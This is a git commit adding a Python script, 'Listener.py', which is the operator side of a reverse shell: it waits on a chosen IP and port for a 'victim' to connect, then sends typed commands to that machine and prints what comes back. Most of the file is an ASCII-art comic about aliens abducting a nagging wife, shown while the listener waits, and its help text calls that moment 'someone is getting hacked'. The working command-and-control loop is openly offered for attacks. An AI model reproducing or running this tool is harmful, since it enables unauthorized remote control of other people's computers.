c52f9ca7bf23c0f435aba74e15b234e50e17c255
k0rup710n <61102077+k0rup710n@users.noreply.github.com>
2021-02-03 10:10:13 +0000

    Add files via upload

---
+++ Listener.py
@@ -0,0 +1,268 @@
+import socket
+import optparse
+import os
+
+def printStory():
+  print("""
+                .       .    )        .           .
+       .       *             .         .
+                     .                      .
+       .       .       .'          .
+                      '.              *        .
+          .   '        .'     .              .
+      __        .    .'          ______        __
+        |          o'           |      |      |  |
+        |                       |      |      |  |
+        |                       |      |   ___|  |_
+      __|_______________________|__..--~~~~ jro    ~--.
+                        /|\\\\
+                       /   \\\\
+                      /  |  \\\\
+                     /       \\\\
+       \\|/          /    |    \\\\
+                   /           \\\\
+                  /      |      \\\\    "Boy, are you ever
+                 /               \\\\  a genius, Harry! Only
+                /        |        \\\\ a total IDIOT like YOU,
+               /                    would run out of gas i                                          /       ____   |           the MIDDLE OF NOWHERE,
+             /   /  __)         ___ at THREE IN THE MORNING!"
+            /    \\(~oo   |     (___)  /
+           /     _\\_-/_       (_o o_)
+          /     /  \\/  \\ |    (_\\O/_)(\\ \\
+         /     / /    \\ \\     //\\_/\\\\\\\\//  \\\\
+         /      \\_\\    | /    //(_ _)\\/    \\\\
+                \\_)___|/     \\\\\\\\/   \\       \\    \\|/
+                 /    |      (/_____\\\\
+                /  /| |        | |\\ \\\\
+                \\  \\| |        | | \\ \\\\
+                 \\__\\_|        |_|  \\_\\\\
+                 (__]__)       <_>  /\\_>
+  """)
+  os.system("sleep 5")
+  os.system("clear")
+  print("""
+    
+        .       .    )        .           .
+   .       *             .         .
+                 .                      .
+   .       .       .'          .
+                  '.              *        .
+      .   '        .'     .              .
+              _.---._   .            .     *
+    *       .'       '.
+        _.-~===========~-._
+       (___________________)       .   *
+  __         \\_______/       ______        __
+    |                       |      |      |  |
+    |                       |      |      |  |
+    |                       |      |   ___|  |_
+  __|_______________________|__..--~~~~ jro    ~--.
+                    /|\\
+                   /   \\
+                  /  |  \\
+                 /       \\
+   \\|/          /    |    \\
+               /           \\    "It's probably a HUNDRED
+              /      |      \\    MILES to a gas station!
+             /               \\   This wind is RUINING MY
+            /        |        \\   HAIR! Why I married a
+           /                     FOOL like YOU, I'll NEVER
+          /   ____   |           KNOW! My parents TOLD ME
+         /   /  __)         ___   you were no good!..."
+        /    \\(~oo   |     (___)  /
+       /     _\\_-/_       (_o o_)
+      /     /  \\/  \\ |    (_\\O/_)   \\
+     /     / /    \\ \\     //\\_/\\\\    \\
+    /      \\ |    /_/    //(_ _)\\\\    \\
+   /        \\|___(_/     \\\\/   \\//     \\    \\|/
+             |    \\      (/_____\\)
+             | |\\  \\      / /| |
+             | |/  /      \\ \\| |
+             |_/__/        \\_|_|
+            (__[__)        <_<_>
+
+  * * * * * * * * * * * * * * * * * * * * * * * * * *
+   * * * * * * * * * * * * * * * * * * * * * * * * *
+            """)
+  os.system("sleep 5")
+  os.system("clear")
+  print("""
+  We only have room
+   for one specimen,       "Let us take the small,
+   Dtlxvr. Which shall     high-decible one, Ftxbp.
+      we take?"               It has less mass."
+             \\  _.-'~~~~'-._   /
+      .      .-~ \\__/  \\__/ ~-.         .
+           .-~   (oo)  (oo)    ~-.
+          (_____//~~\\\\//~~\\\\______)
+     _.-~`                         `~-._
+    /O=O=O=O=O=O=O=O=O=O=O=O=O=O=O=O=O=O\\     *
+    \\___________________________________/
+               \\x x x x x x x/
+       .  *     \\x_x_x_x_x_x/
+  jro
+  """)
+  os.system("sleep 3")
+  ask = input("[+] Who should they take (dude/dudette)? : ")
+  if(ask == "dudette"):
+    print("[+] Let's take this fucker !")
+    os.system("sleep 2.5")
+    os.system("clear")
+    print("""
+            
+      .       .    )        .           .
+   .       *             .         .
+               .                      .
+   .       .                   .
+                                *        .
+      .   '               .              .
+              _.---._   .            .     *
+    *       .'       '.
+        _.-~===========~-._
+       (___________________)       .   *
+  __  .'     \\_______/   .'  ______        __
+    |              .'  .'   |      |      |  |
+    |             '         |      |      |  |
+    |                       |      |   ___|  |_
+  __|_______________________|__..--~~~~ jro    ~--.
+                    /|\\
+                   /   \\
+                  /  |  \\
+                 /       \\
+   \\|/          /    |    \\
+               /           \\
+              /      |      \\
+             /               \\
+            /
+           /       "BRING MY WIFE BACK,
+          /    __  YOU COSMIC KIDNAPPERS!"
+         /    /  \\ /
+        /    (\\__/)  |            \\
+       /     _\\__/_                \\
+      /     /      \\ |              \\
+     /     / /   / /                 \\
+           \\ |   \\_\\                  \\
+            \\|____\\_)                  \\    \\|/
+             |    \\
+             | |\\  \\ 
+             | |/  /
+             |_/__/
+            (__[__)
+
+                    """)
+
+  os.system("sleep 5")
+  os.system("clear")
+  print("""
+                    .       .    )        .           .
+   .       *             .         .
+                 .                      .
+   .       .          o        .
+                    .'            *        .
+      .   '       .'      .              .
+  __        .   .'           ______        __
+    |           '.          |      |      |  |
+    |            .'         |      |      |  |
+    |                       |      |   ___|  |_
+  __|_______________________|__..--~~~~ jro    ~--.
+                    /|\\
+                   /   \\
+                  /  |  \\
+                 /       \\
+   \\|/          /    |    \\
+               /           \\
+              /      |      \\
+             /               \\
+            /        |        \\
+           /   _               \\
+          /   /_\\    |          \\
+         /    \\_/                \\
+        /    /   \\   |            \\
+       /     \\|_|/                 \\
+      /       |||    |              \\
+     /        |||                    \\
+    /        (_|_)   |                \\
+   /                                   \\    \\|/
+                    """)
+  os.system("sleep 2.5")
+  os.system("clear")
+  print("""
+                    .       .    )        .           .
+   .       *             .         .
+                 .                      .
+   .       .                   .
+                                  *        .
+      .   '               .              .
+  __        .                ______        __
+    |                       |      |      |  |
+    |                       |      |      |  |
+    |                       |      |   ___|  |_
+  __|_______________________|__..--~~~~ jro    ~--.
+                    /|\\
+                   /   \\
+                  /  |  \\
+                 /       \\
+ \\|/             /    |    \\
+               /           \\
+              /
+             /   "Cripes, that WAS stupid! What
+            /     if they'd actually HEARD me
+           /        and brought her BACK!"
+          /   ____   /
+         /   /  __)              \\
+        /    \\(~oo   |            \\
+       /     _\\_o/_                \\
+      /     /  \\/  \\ |              \\
+     /     / /    \\ \\                \\
+    /      \\ |    /_/                 \\
+   /        \\|___(_/                   \\    \\|/
+             |    \\
+             | |\\  \\
+             | |/  /
+             |_/__/
+            (__[__)
+
+ASCII BY : Jonathon R. Oglesbee
+https://asciiart.website/index.php?art=creatures%2Faliens
+
+  """)
+def getIP():
+    parser = optparse.OptionParser()
+    parser.add_option("-i", "--ip", dest="ip", help="Listening IP address")
+    parser.add_option("-p", "--port", dest="port", help="Listening Port")
+    parser.add_option("-s", "--story", dest="story", help="A small and fun story is popping everytime someone is getting hacked ! [true or false] (Make sure you have a nice screen, not a phone)")
+    (options, arguments) = parser.parse_args()
+    if not options.ip:
+        parser.error("Please enter the IP you're using for listening connections")
+    if not options.port:
+        parser.error("Please enter the Port you're using for listening connections")
+    else:
+        return options
+
+args = getIP()
+listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+listener.bind((args.ip, int(args.port)))
+listener.listen(0)
+print("[+] Listening for victim connection...")
+if args.story == "true" or args.story == "True":
+    printStory()
+connection, address = listener.accept()
+print(f"[+] Victim connected from {address} !")
+
+while True:
+    try:
+        command = input(">> ").encode()
+        connection.send(command)
+        result = connection.recv(1024)
+        result = result.decode(errors="replace")
+        print(result)
+    except KeyboardInterrupt:
+        ask = input("\nAre you sure you want to terminate the session Y or N : ")
+        if ask == "Y" or ask == "y":
+            print("[+] Session Terminated !")
+            break;
+        elif ask == "N" or ask == "n" :
+            print("[+] Wise decision samurai !")
+
+listener.close()
